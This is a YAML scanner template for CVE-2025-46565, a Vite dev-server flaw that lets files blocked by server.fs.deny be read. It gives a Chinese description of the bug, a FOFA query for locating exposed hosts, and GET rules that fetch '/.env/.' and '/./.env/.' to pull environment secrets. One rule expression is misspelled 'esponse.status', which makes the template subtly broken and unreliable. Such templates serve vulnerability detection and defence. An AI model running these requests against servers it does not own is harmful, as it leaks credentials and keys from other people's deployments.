id: CVE-2025-46565

info:
  name: Vite 信息泄露
  author: zan8in
  severity: medium
  description: |
    Vite 是一个用于 JavaScript 的前端工具框架。在 6.3.4、6.2.7、6.1.6、5.4.19 和 4.5.14 之前的版本中，项目根目录下被文件匹配模式拒绝的文件内容可能会被返回给浏览器。只有明确将 Vite 开发服务器暴露给网络的应用程序（使用 --host 或 server.host 配置选项）会受到影响。只有位于项目根目录下且被文件匹配模式拒绝的文件可能被绕过。server.fs.deny 可以包含匹配文件的模式（默认情况下，它包括 .env、.env.*、*.{crt,pem} 等模式）。这些模式能够通过使用斜杠和点（/.）的组合来绕过 root 下的文件。该问题已在 6.3.4、6.2.7、6.1.6、5.4.19 和 4.5.14 版本中修复
    fofa: icon_hash="-1207029254" || icon_hash="-1252041730"
  reference:
    - https://mp.weixin.qq.com/s/wVDsZ1XlINSLe1VFnu4HJA
    - https://nvd.nist.gov/vuln/detail/CVE-2025-46565
  tags: cve,cve2025,vite,disclosure
  created: 2025/12/26

rules:
  r0:
    request:
      method: GET
      path: /.env
    expression: response.status == 403 && response.body.bcontains("Restricted")
  r1:
    request:
      method: GET
      path: "/.env/."
    expression: esponse.status == 200
  r2:
    request:
      method: GET
      path: "/./.env/."
    expression: response.status == 200
expression: r0() && r1() && r2()
